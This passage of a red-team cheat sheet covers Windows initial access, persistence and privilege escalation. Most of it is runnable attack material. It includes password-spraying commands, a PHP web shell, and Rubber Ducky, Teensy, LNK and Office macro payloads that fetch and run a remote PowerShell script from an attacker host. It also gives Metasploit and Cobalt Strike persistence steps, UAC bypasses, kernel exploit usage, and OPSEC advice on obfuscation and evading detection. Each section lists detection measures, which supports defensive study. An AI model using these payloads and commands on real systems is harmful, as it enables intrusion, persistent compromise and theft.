malicious attachments\n*   User security awareness training\n*   Application whitelisting\n\n**Tools / References:**\n*   GoPhish\n*   King Phisher\n*   SET\n*   MSFVenom\n*   Evilginx2\n\n**OPSEC / Notes:**\n*   Use realistic lures\n*   Obfuscate macros\n*   Test against email security controls\n\n### Valid Accounts\n\n**What it is / Why it matters:** Utilizing legitimate credentials to access systems. These are often obtained through methods like password spraying, breach dumps, or exploiting weak default credentials.\n\n**Quick Steps / Commands:**\n\n*   **Password Spraying:**\n\n    ```bash\n    # CrackMapExec for SMB spraying\n    crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2024!' --no-bruteforce\n\n    # Domain password spray with PowerView\n    Invoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2024!' -Domain corp.local\n\n    # Kerberos pre-auth spraying\n    GetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.10.10.2 corp.local/\n    ```\n\n*   **Credential Stuffing:**\n\n    ```bash\n    # Use breach-compromised credentials\n    crackmapexec smb 10.10.10.0/24 -u breached_users.txt -p breached_passwords.txt\n\n    # With known valid domain\n    crackmapexec smb 10.10.10.0/24 -u user -p password -d corp.local\n    ```\n\n*   **Default Credentials:**\n\n    ```bash\n    # Common default credentials\n    # admin:admin, administrator:password, guest:guest\n    crackmapexec smb 10.10.10.0/24 -u default_users.txt -p default_passwords.txt\n    ```\n\n**What to Expect:** Expect to gain valid domain or local account access. Be aware that this may trigger account lockout policies.\n\n**Detection / Hardening:**\n\n*   Account lockout policies (5-10 attempts)\n*   Multi-factor authentication (MFA)\n*   Impossible travel detection\n*   Login time restrictions\n*   Regular password rotation\n\n**Tools / References:**\n*   CrackMapExec\n*   Hydra\n*   Metasploit\n*   PowerView\n\n**OPSEC / Notes:**\n*   Avoid account lockouts\n*   Use low-and-slow approaches\n*   Research target password policies\n\n### Drive-by Compromise\n\n**What it is / Why it matters:** Compromising users by exploiting browser vulnerabilities or social engineering when they visit malicious websites.\n\n**Quick Steps / Commands:**\n\n*   **Browser Exploit Delivery:**\n\n    ```bash\n    # Metasploit browser exploit\n    use exploit/multi/browser/java_jre17_driver_manager\n    set payload windows/meterpreter/reverse_https\n    set LHOST 10.10.14.20\n    set LPORT 443\n    exploit\n\n    # Generate malicious iframe\n    <iframe src=\"http://10.10.14.20:8080/exploit\" width=\"0\" height=\"0\" style=\"border:0; display:none;\"></iframe>\n    ```\n\n*   **Fake Updates:**\n\n    ```javascript\n    // JavaScript fake update prompt\n    if(confirm(\"Adobe Flash Player update required. Install now?\")) {\n        window.location = \"http://10.10.14.20/FlashPlayer_installer.exe\";\n    }\n    ```\n\n*   **Watering Hole Attacks:**\n\n    ```bash\n    # Compromise legitimate website\n    # Inject malicious code into frequently visited site\n    <script src=\"http://10.10.14.20/exploit.js\"></script>\n    ```\n\n**What to Expect:** Expect to gain shell access when a user visits a compromised site with a vulnerable browser or plugins.\n\n**Detection / Hardening:**\n\n*   Network monitoring for beaconing\n*   Browser isolation technologies\n*   Content Security Policy (CSP)\n*   Regular browser/plugin updates\n*   EDR monitoring browser child processes\n\n**Tools / References:**\n*   Metasploit\n*   BeEF\n*   Social Engineer Toolkit\n\n**OPSEC / Notes:**\n*   Use SSL certificates\n*   Reputable-looking domains\n*   Test exploit reliability\n\n### Exploits (RCE, 0-Days)\n\n**What it is / Why it matters:** Leveraging software vulnerabilities for remote code execution (RCE), ranging from publicly available exploits to undisclosed 0-days.\n\n**Quick Steps / Commands:**\n\n*   **Public Exploit Usage:**\n\n    ```bash\n    # Search for exploits\n    searchsploit \"Apache 2.4.49\"\n    searchsploit \"Windows SMB\"\n\n    # Metasploit modules\n    use exploit/windows/smb/ms17_010_eternalblue\n    set RHOSTS 10.10.10.10\n    exploit\n\n    # Manual exploit compilation\n    gcc -o exploit exploit.c\n    ./exploit\n    ```\n\n*   **Web Application RCE:**\n\n    ```bash\n    # SQL injection to RCE\n    '; EXEC xp_cmdshell 'whoami' --\n\n    # File upload RCE\n    <?php system($_GET['cmd']); ?>\n\n    # Deserialization attacks\n    java -jar ysoserial.jar CommonsCollections1 'cmd.exe /c whoami' > payload.ser\n    ```\n\n*   **Service Exploitation:**\n\n    ```bash\n    # SSH exploitation\n    use auxiliary/scanner/ssh/ssh_login\n    set RHOSTS 10.10.10.0/24\n    set USERNAME root\n    set PASS_FILE /usr/share/wordlists/rockyou.txt\n    run\n\n    # Database exploitation\n    use auxiliary/scanner/mysql/mysql_login\n    set RHOSTS 10.10.10.0/24\n    run\n    ```\n\n**What to Expect:** Expect direct system access through exploited software vulnerabilities. This may, however, cause service disruption.\n\n**Detection / Hardening:**\n\n*   Regular vulnerability scanning\n*   Patch management\n*   Web Application Firewall (WAF) implementation\n*   Network segmentation\n*   EDR exploit prevention\n\n**Tools / References:**\n*   Metasploit\n*   SearchSploit\n*   Nuclei\n*   Custom exploit code\n\n**OPSEC / Notes:**\n*   Research target environment\n*   Test exploits in a lab environment\n*   Have fallback methods\n\n### USB/Removable Media Attacks\n\n**What it is / Why it matters:** Physical attacks that use USB devices for initial access, particularly effective in air-gapped environments.\n\n**Quick Steps / Commands:**\n\n*   **Bad USB Attacks:**\n\n    ```bash\n    # Rubber Ducky payload\n    DELAY 2000\n    GUI r\n    DELAY 500\n    STRING powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\n    ENTER\n\n    # Teensy payload\n    void setup() {\n        Keyboard.begin();\n        delay(3000);\n        Keyboard.press(KEY_LEFT_GUI);\n        Keyboard.press('r');\n        Keyboard.releaseAll();\n        delay(500);\n        Keyboard.print(\"cmd.exe /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\");\n        Keyboard.press(KEY_RETURN);\n        Keyboard.releaseAll();\n    }\n    ```\n\n*   **AutoRun INF Files:**\n\n    ```ini\n    [autorun]\n    open=malware.exe\n    icon=malware.exe\n    action=Open documents\n    label=Corporate Files\n    ```\n\n*   **LNK File Attacks:**\n\n    ```powershell\n    # Malicious LNK file\n    $WshShell = New-Object -comObject WScript.Shell\n    $Shortcut = $WshShell.CreateShortcut(\"Important Documents.lnk\")\n    $Shortcut.TargetPath = \"cmd.exe\"\n    $Shortcut.Arguments = \"/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\n    $Shortcut.Save()\n    ```\n\n**What to Expect:** Physical access to the target is required. Success depends heavily on AutoRun settings and user behavior.\n\n**Detection / Hardening:**\n\n*   Disable AutoRun via GPO\n*   USB device control policies\n*   User training on unknown devices\n*   Endpoint monitoring for USB device insertion\n*   Application whitelisting\n\n**Tools / References:**\n*   USB Rubber Ducky\n*   Teensy\n*   PoisonTap\n*   Evilduino\n\n**OPSEC / Notes:**\n*   Consider physical security\n*   Use convincing device labels\n*   Test on target OS versions"
      },
      {
        "title": "3. 🔁 Persistence",
        "content": "## 3. 🔁 Persistence\n\n### 3.1 Registry Keys\n\n#### What It Is / Why It Matters\nWindows Registry run keys automatically execute programs on user logon or system startup. This is a classic persistence mechanism that is often hard to detect.\n\n#### Quick Steps / Commands\n\n**User-level persistence:**\n\n```cmd\n# Current User Run Key\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"C:\\malware.exe\" /f\n\n# Explorer Run Key\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\malware.exe\" /f\n```\n\n**System-level persistence:**\n\n```cmd\n# Local Machine Run Key (requires admin)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemUpdate\" /t REG_SZ /d \"C:\\malware.exe\" /f\n\n# RunOnce Key (executes once then deletes)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"Cleanup\" /t REG_SZ /d \"C:\\malware.exe\" /f\n```\n\n**Advanced registry persistence:**\n\n```cmd\n# UserInit MPR Logon Script (executes before explorer)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"UserInit\" /t REG_SZ /d \"C:\\malware.exe,\" /f\n\n# AppInit DLLs (DLLs loaded into every process)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"AppInit_DLLs\" /t REG_SZ /d \"C:\\malware.dll\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"LoadAppInit_DLLs\" /t REG_DWORD /d 1 /f\n```\n\n**PowerShell registry modification:**\n\n```powershell\n# Create run key via PowerShell\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"UpdateService\" -Value \"C:\\malware.exe\" -PropertyType String -Force\n\n# Check existing run keys\nGet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\n```\n\n#### What to Expect\nMalware executes automatically on user login. Registry changes persist through reboots. Some locations require administrative privileges.\n\n#### Detection / Hardening\n*   Monitor registry changes in Run keys (**Sysmon Event ID 12, 13**)\n*   Application whitelisting (**AppLocker**)\n*   **EDR** detection of suspicious Run key modifications\n*   Regular auditing of autorun locations\n*   Use Microsoft's **Autoruns** tool for detection\n\n#### Tools / References\n**reg.exe**, **PowerShell**, **Autoruns**, **Metasploit** persistence modules\n\n#### OPSEC / Notes\nUse legitimate-looking key names. Consider using fileless techniques with `regsvr32`, `mshta`, or `rundll32`. Clean up registry entries after engagement.\n\n### 3.2 Scheduled Tasks\n\n#### What It Is / Why It Matters\nWindows Task Scheduler can be abused to execute malicious code at specific times, on user logon, or system startup. This is a very reliable persistence mechanism.\n\n#### Quick Steps / Commands\n\n**Command-line scheduled tasks:**\n\n```cmd\n# Create task running as SYSTEM\nschtasks /create /tn \"SystemUpdate\" /tr \"C:\\malware.exe\" /sc onstart /ru SYSTEM /f\n\n# Create task running on user logon\nschtasks /create /tn \"UserUpdate\" /tr \"C:\\malware.exe\" /sc onlogon /ru \"%USERNAME%\" /f\n\n# Create daily task\nschtasks /create /tn \"DailyMaintenance\" /tr \"C:\\malware.exe\" /sc daily /st 09:00 /f\n\n# Run task immediately\nschtasks /run /tn \"SystemUpdate\"\n\n# Delete task (cleanup)\nschtasks /delete /tn \"SystemUpdate\" /f\n```\n\n**PowerShell scheduled tasks:**\n\n```powershell\n# Create scheduled task via PowerShell\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -File C:\\malware.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName \"WindowsUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest -User \"SYSTEM\"\n\n# Create task for specific user\n$Trigger = New-ScheduledTaskTrigger -AtLogOn -User \"DOMAIN\\User\"\nRegister-ScheduledTask -TaskName \"OfficeUpdate\" -Action $Action -Trigger $Trigger\n\n# List all tasks\nGet-ScheduledTask | Where-Object {$_.State -ne \"Disabled\"}\n```\n\n**Hidden scheduled tasks:**\n\n```cmd\n# Create hidden task (not visible in Task Scheduler UI)\nschtasks /create /tn \"\\Microsoft\\Windows\\SystemMaintenance\" /tr \"C:\\malware.exe\" /sc daily /st 00:00 /ru SYSTEM /f\n```\n\n**Task with arguments:**\n\n```cmd\n# Task with command arguments\nschtasks /create /tn \"PowerShellUpdate\" /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\malware.ps1\" /sc once /st 00:00 /f\n```\n\n#### What to Expect\nReliable execution at specified times or events. Tasks survive reboots. Some task creation requires administrative privileges.\n\n#### Detection / Hardening\n*   Monitor scheduled task creation (**Sysmon Event ID 106**)\n*   Audit scheduled tasks regularly\n*   **EDR** detection of suspicious task names or actions\n*   Limit who can create scheduled tasks via GPO\n*   Use PowerShell `Get-ScheduledTask` for auditing\n\n#### Tools / References\n**schtasks.exe**, PowerShell `ScheduledTask` module, Task Scheduler MMC\n\n#### OPSEC / Notes\nUse task names that mimic legitimate system tasks. Place executable in common system directories. Consider using system binaries for fileless execution.\n\n### 3.3 Startup Folders\n\n#### What It Is / Why It Matters\nSimple persistence via files placed in startup folders that automatically execute when a user logs in. This has a low technical barrier but is easily detectable.\n\n#### Quick Steps / Commands\n\n**User startup folder:**\n\n```cmd\n# Current user startup (most common)\ncopy malware.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe\"\n\n# Alternative user startup path\ncopy malware.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe\"\n```\n\n**System startup folder (requires admin):**\n\n```cmd\n# All users startup folder\ncopy malware.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\malware.exe\"\n\n# Alternative system startup (shortcut)\ncopy malware.exe \"C:\\Users\\Public\\Desktop\\malware.lnk\"\n```\n\n**Startup folder via PowerShell:**\n\n```powershell\n# Copy to startup via PowerShell\nCopy-Item \"malware.exe\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe\"\n\n# Create shortcut in startup\n$WshShell = New-Object -comObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.lnk\")\n$Shortcut.TargetPath = \"C:\\malware.exe\"\n$Shortcut.Save()\n```\n\n**Fileless startup techniques:**\n\n```cmd\n# Script files in startup\necho powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\" > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat\"\n\n# VBScript in startup\necho Set shell = CreateObject(\"Wscript.Shell\"): shell.Run \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, True > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs\"\n```\n\n#### What to Expect\nFile executes when user logs in. Very reliable but easily spotted. No special privileges required for the user startup folder.\n\n#### Detection / Hardening\n*   Regular scanning of startup folders\n*   **EDR** monitoring of startup folder modifications\n*   Application control blocking unauthorized executables\n*   User training on suspicious files\n*   Monitor process creation from startup locations\n\n#### Tools / References\nWindows Explorer, **PowerShell**, Batch files\n\n#### OPSEC / Notes\nUse filenames that mimic legitimate software. Consider using scripts instead of executables. Clean up startup entries after engagement.\n\n### 3.4 Services\n\n#### What It Is / Why It Matters\nCreating Windows services that run automatically at system startup with `SYSTEM` privileges. This is a highly reliable and powerful persistence mechanism.\n\n#### Quick Steps / Commands\n\n**Create Windows service:**\n\n```cmd\n# Create service via sc\nsc create \"WindowsUpdateService\" binPath= \"C:\\malware.exe\" start= auto\nsc start \"WindowsUpdateService\"\n\n# Create service with description\nsc create \"SystemMonitor\" binPath= \"C:\\malware.exe\" start= auto DisplayName= \"System Monitoring Service\"\n```\n\n**PowerShell service creation:**\n\n```powershell\n# Create service via PowerShell\nNew-Service -Name \"UpdateService\" -BinaryPathName \"C:\\malware.exe\" -StartupType \"Automatic\" -Description \"Windows Update Service\"\n\n# Start the service\nStart-Service -Name \"UpdateService\"\n\n# Modify existing service\nsc config \"BITS\" binPath= \"C:\\malware.exe\"\n```\n\n**Service with dependencies:**\n\n```cmd\n# Create service that depends on critical services (starts after them)\nsc create \"CriticalUpdate\" binPath= \"C:\\malware.exe\" start= auto depend= \"LanmanServer/LanmanWorkstation\"\n```\n\n**Service recovery options:**\n\n```cmd\n# Configure service to restart on failure\nsc failure \"WindowsUpdateService\" reset= 60 actions= restart/5000/restart/5000/restart/5000\nsc failure \"WindowsUpdateService\" command= \"C:\\malware.exe\"\n```\n\n**PowerShell advanced service management:**\n\n```powershell\n# Create service with full configuration\n$service = @{\n    Name = \"SystemMonitor\"\n    BinaryPathName = \"C:\\malware.exe\"\n    StartupType = \"Automatic\"\n    Description = \"System Monitoring and Maintenance\"\n    DisplayName = \"System Monitor\"\n}\nNew-Service @service\n\n# Check service status\nGet-Service -Name \"SystemMonitor\"\n```\n\n#### What to Expect\nService runs with `SYSTEM` privileges on boot. Highly reliable persistence. Requires administrative privileges to create services.\n\n#### Detection / Hardening\n*   Monitor service creation (**Sysmon Event ID 7045**)\n*   Regular service auditing\n*   **EDR** detection of suspicious service names or binary paths\n*   Service executable digital signature verification\n*   Least privilege principle for service accounts\n\n#### Tools / References\n**sc.exe**, **PowerShell**, Services MMC, **MSFVenom** service persistence\n\n#### OPSEC / Notes\nUse service names that mimic legitimate Windows services. Place executable in system directories. Consider service recovery options for resilience.\n\n### 3.5 Office Macros\n\n#### What It Is / Why It Matters\nVBA macros in Office documents execute payloads when documents are opened. This is a classic initial access vector that can also provide persistence if documents are regularly used.\n\n#### Quick Steps / Commands\n\n**Basic `AutoOpen` macro:**\n\n```vba\nSub AutoOpen()\n    Dim payload As String\n    payload = \"powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\"\n    Shell payload, vbHide\nEnd Sub\n\n' Alternative for different Office versions\nSub Document_Open()\n    AutoOpen\nEnd Sub\n\nSub Workbook_Open()\n    AutoOpen\nEnd Sub\n```\n\n**Stealthier macro techniques:**\n\n```vba\n' Using WScript.Shell for execution\nSub AutoOpen()\n    Dim ws As Object\n    Set ws = CreateObject(\"WScript.Shell\")\n    ws.Run \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, False\nEnd Sub\n\n' Using MSXML for download and execution\nSub Document_Open()\n    Dim xml As Object, stream As Object, shell As Object\n    Set xml = CreateObject(\"MSXML2.XMLHTTP\")\n    Set stream = CreateObject(\"ADODB.Stream\")\n    Set shell = CreateObject(\"WScript.Shell\")\n\n    xml.Open \"GET\", \"http://10.10.14.20/payload.exe\", False\n    xml.Send\n\n    stream.Open\n    stream.Type = 1\n    stream.Write xml.responseBody\n    stream.SaveToFile \"C:\\Users\\Public\\payload.exe\", 2\n    stream.Close\n\n    shell.Run \"C:\\Users\\Public\\payload.exe\", 0, False\nEnd Sub\n```\n\n**Macro with embedded payload:**\n\n```vba\n' Base64 encoded payload in macro\nSub AutoOpen()\n    Dim base64 As String, payload As String, shell As Object\n    base64 = \"BASE64_ENCODED_PAYLOAD_HERE\"\n\n    ' Decode and execute (simplified example)\n    Set shell = CreateObject(\"WScript.Shell\")\n    shell.Run \"powershell -enc \" & base64, 0, False\nEnd Sub\n```\n\n**Persistence through template modification:**\n\n```vba\n' Modify Normal.dotm template (Word) for persistence\nSub AutoExec()\n    ' Runs when Word starts\n    Shell \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", vbHide\nEnd Sub\n```\n\n#### What to Expect\nMacro executes when the document is opened. May trigger security warnings. User must enable content for execution.\n\n#### Detection / Hardening\n*   Block macros from internet sources via GPO\n*   Monitor `winword.exe` spawning unusual child processes\n*   **EDR** detection of macro behavior patterns\n*   Office security settings to disable macros\n*   **AMSI** scanning of macro content\n\n#### Tools / References\nMicrosoft Office, **Macro Pack**, **Unicorn**, **Evil Clippy**\n\n#### OPSEC / Notes\nUse social engineering to encourage enabling macros. Obfuscate macro code. Consider document properties and metadata for realism.\n\n### 3.6 Implant Persistence (C2 Frameworks)\n\n#### What It Is / Why It Matters\nBuilt-in persistence mechanisms in Command and Control frameworks automatically maintain access even after reboots or connection loss.\n\n#### Quick Steps / Commands\n\n**Metasploit persistence:**\n\n```bash\n# Meterpreter persistence module\nrun persistence -U -i 60 -p 443 -r 10.10.14.20\n\n# Advanced options\nrun persistence -U -i 30 -p 443 -r 10.10.14.20 -S -A -X\n\n# Service persistence\nrun persistence -S -U -i 60 -p 443 -r 10.10.14.20\n\n# Clean up persistence\nrun multi_console_command -rc /root/.msf4/logs/persistence/clean_up.rc\n```\n\n**Cobalt Strike persistence:**\n\n```bash\n# Elevate to SYSTEM and create service\nbeacon> getsystem\nbeacon> powerpick Get-Service\n\n# Create scheduled task for persistence\nbeacon> schtasks /create /tn \"SystemUpdate\" /tr \"C:\\beacon.exe\" /sc onstart /ru SYSTEM\n\n# Make token and run as admin for persistence\nbeacon> make_token DOMAIN\\User Password123\nbeacon> runasadmin\n```\n\n**Empire persistence modules:**\n\n```bash\n# Empire stager with persistence\nusestager windows/launcher_bat\nset Listener http\nset OutFile /tmp/stager.bat\nexecute\n\n# Persistence module\nusemodule persistence/elevated/wmi\nset Listener http\nset DailyTime 09:00\nexecute\n```\n\n**Custom beacon persistence scripts:**\n\n```powershell\n# PowerShell persistence script for C2\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\beacon.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName \"WindowsUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest -User \"SYSTEM\"\n```\n\n**Memory-based persistence:**\n\n```bash\n# Reflective DLL injection for fileless persistence\nbeacon> inject 0 listener\n\n# Process hollowing for stealth\nbeacon> shinject 1520 x64 /payloads/beacon.bin\n```\n\n#### What to Expect\nAutomated persistence that survives reboots. Multiple fallback mechanisms. Integration with C2 framework for management.\n\n#### Detection / Hardening\n*   **EDR** detection of C2 framework signatures\n*   Monitor for unusual scheduled tasks or services\n*   Network traffic analysis for beaconing patterns\n*   Memory analysis for injected code\n*   Application control policies\n\n#### Tools / References\n**Metasploit**, **Cobalt Strike**, **Empire**, **Sliver**\n\n#### OPSEC / Notes\nUse custom payloads to avoid signature detection. Implement jitter and sleep times. Use domain fronting and encrypted C2 channels.\n\n## 4. 🚀 Privilege Escalation\n\n### 4.1 Token Manipulation\n\n#### What It Is / Why It Matters\nAbusing Windows access tokens to impersonate higher-privileged users or `SYSTEM`. Critical for moving from user to admin privileges.\n\n#### Quick Steps / Commands\n\n**Metasploit token commands:**\n\n```bash\n# List available tokens\nmeterpreter > use incognito\nmeterpreter > list_tokens -u\n\n# Impersonate token\nmeterpreter > impersonate_token \"DOMAIN\\\\Administrator\"\n\n# Revert to original token\nmeterpreter > revert_to_self\n\n# Steal token from process\nmeterpreter > steal_token <pid>\n```\n\n**Rotten Potato/Juicy Potato:**\n\n```bash\n# Juicy Potato for SERVICE -> SYSTEM\nJuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t *\n\n# Rotten Potato from meterpreter\nmeterpreter > upload /usr/share/webshells/rottenpotato.exe\nmeterpreter > execute -H -c -f rottenpotato.exe\nmeterpreter > getuid\n```\n\n**PowerShell token manipulation:**\n\n```powershell\n# PowerShell Incognito module\nImport-Module .\\Incognito.ps1\nInvoke-TokenManipulation -ImpersonateUser -Username \"DOMAIN\\Administrator\"\n\n# Check current token privileges\nwhoami /priv\nwhoami /groups\n```\n\n**Manual token theft with C++:**\n\n```cpp\n// Requires SeDebugPrivilege\nOpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);\nDuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);\nImpersonateLoggedOnUser(hDupToken);\n```\n\n#### What to Expect\nAbility to execute commands as different users. `SYSTEM` privileges from service accounts. May require specific privileges like `SeImpersonate`.\n\n#### Detection / Hardening\n*   Monitor token manipulation (**Windows Event 4672**)\n*   **EDR** detection of token theft patterns\n*   Limit `SeDebugPrivilege` and `SeImpersonatePrivilege`\n*   Protected Process Light (**PPL**) for critical services\n*   Regular privilege audits\n\n#### Tools / References\n**Incognito**, **Juicy Potato**, **Rotten Potato**, **Metasploit** token modules\n\n#### OPSEC / Notes\nUse from service accounts with `SeImpersonate`. Avoid obvious process injection. Clean up tokens after use.\n\n### 4.2 UAC Bypass\n\n#### What It Is / Why It Matters\nBypassing User Account Control (UAC) prompts to execute code with elevated privileges without user interaction. Essential for `admin` -> `SYSTEM` escalation.\n\n#### Quick Steps / Commands\n\n**FodHelper UAC bypass:**\n\n```cmd\n# Registry modification for fodhelper\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /f\nfodhelper.exe\n\n# Cleanup\nreg delete \"HKCU\\Software\\Classes\\ms-settings\\\" /f\n```\n\n**Event Viewer UAC bypass:**\n\n```cmd\n# Using eventvwr.exe\nreg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d \"C:\\malware.exe\" /f\neventvwr.exe\n```\n\n**Metasploit UAC modules:**\n\n```bash\n# Various UAC bypass modules\nuse exploit/windows/local/bypassuac\nuse exploit/windows/local/bypassuac_injection\nuse exploit/windows/local/bypassuac_eventvwr\nset SESSION 1\nexploit\n```\n\n**PowerShell UAC bypass:**\n\n```powershell\n# PowerShell UAC bypass\nImport-Module .\\Invoke-UACBypass.ps1\nInvoke-UACBypass -Payload \"C:\\malware.exe\"\n\n# Alternative method\nStart-Process \"C:\\malware.exe\" -Verb RunAs\n```\n\n**SilentClean UAC bypass:**\n\n```cmd\n# Using sdclt.exe\nreg add \"HKCU\\Software\\Classes\\exefile\\shell\\runas\\command\" /d \"C:\\malware.exe\" /f\nsdclt.exe /kickoffelev\n```\n\n#### What to Expect\nElevated privileges without UAC prompt. Works on default UAC settings. Requires user to be in local administrators group.\n\n#### Detection / Hardening\n*   Monitor registry modifications in `Classes` keys\n*   **EDR** detection of UAC bypass patterns\n*   Set UAC to highest level\n*   **AppLocker** restrictions\n*   Process monitoring for elevation patterns\n\n#### Tools / References\n**UACME**, **Metasploit** UAC modules, **PowerShell Empire**\n\n#### OPSEC / Notes\nTest on target OS version. Use least noisy method first. Clean registry changes after execution.\n\n### 4.3 Kernel Exploits\n\n#### What It Is / Why It Matters\nExploiting vulnerabilities in the Windows kernel to gain `SYSTEM` privileges. High-risk but highly effective for privilege escalation.\n\n#### Quick Steps / Commands\n\n**Identify potential exploits:**\n\n```bash\n# Windows Exploit Suggester\npython windows-exploit-suggester.py --database 2021-06-10-mssb.xls --systeminfo systeminfo.txt\n\n# Manual system info collection\nsysteminfo\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Metasploit local exploit suggester\nuse post/multi/recon/local_exploit_suggester\nset SESSION 1\nrun\n```\n\n**Common kernel exploits:**\n\n```bash\n# EternalBlue (MS17-010)\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.10\nexploit\n\n# BlueKeep (CVE-2019-0708)\nuse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOST 10.10.10.10\nexploit\n\n# PrintNightmare (CVE-2021-1675)\nuse exploit/windows/dcerpc/cve_2021_1675_printspooler\nset RHOST 10.10.10.10\nexploit\n```\n\n**Compile and run exploits:**\n\n```bash\n# Download and compile exploit\nwget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/MS16-032.rar\nunrar x MS16-032.rar\ncd MS16-032\ni686-w64-mingw32-gcc MS16-032.c -o MS16-032.exe\n\n# Upload and execute\nmeterpreter > upload MS16-032.exe\nmeterpreter > shell\nC:\\> MS16-032.exe\n```\n\n**Linux kernel exploits:**\n\n```bash\n# Linux Exploit Suggester\n./linux-exploit-suggester.sh\n\n# DirtyCow (CVE-2016-5195)\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty\n\n# DirtyPipe (CVE-2022-0847)\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe\n```\n\n#### What to Expect\n`SYSTEM` privileges if successful. System instability or crashes if failed. May trigger antivirus/**EDR**.\n\n#### Detection / Hardening\n*   Regular patching and updates\n*   **EDR** kernel-level monitoring\n*   Driver signature enforcement\n*   Kernel Patch Protection (**PatchGuard**)\n*   System crash analysis\n\n#### Tools / References\n**Windows-Exploit-Suggester**, **Linux-Exploit-Suggester**, **Metasploit**, **ExploitDB**\n\n#### OPSEC / Notes\nTest exploits in similar environment first. Have backup access methods. Consider system stability impact.\n\n### 4.4 Unquoted Service Paths\n\n#### What It Is / Why It Matters\nWindows services with unquoted paths containing spaces can be hijacked by placing malicious executables in earlier path components.\n\n#### Quick Steps / Commands\n\n**Find unquoted service paths:**\n\n```cmd\n# Using wmic\nwmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\n\n# Using PowerShell\nGet-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '\"*\"'} | Select-Object Name, PathName\n\n# Manual checking\nsc qc \"ServiceName\"\n```\n\n**Identify writable directories:**\n\n```cmd\n# Check permissions on directories\nicacls \"C:\\Program Files\\Vulnerable App\"\naccesschk.exe -uwdq \"C:\\Program Files\\Vulnerable App\"\n\n# Using PowerShell\nGet-Acl \"C:\\Program Files\\Vulnerable App\" | Format-List\n```\n\n**Exploit example:**\n\n```cmd\n# Service path: C:\\Program Files\\Vulnerable App\\service.exe\n# Place malware at: C:\\Program.exe\n\n# Or service path: C:\\Program Files\\Vulnerable Folder\\service.exe\n# Place malware at: C:\\Program Files\\Vulnerable.exe\n\ncopy malware.exe \"C:\\Program.exe\"\n# Service will try to run C:\\Program.exe instead of the intended executable\n```\n\n**Automated tools:**\n\n```powershell\n# PowerSploit module\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# WinPEAS for 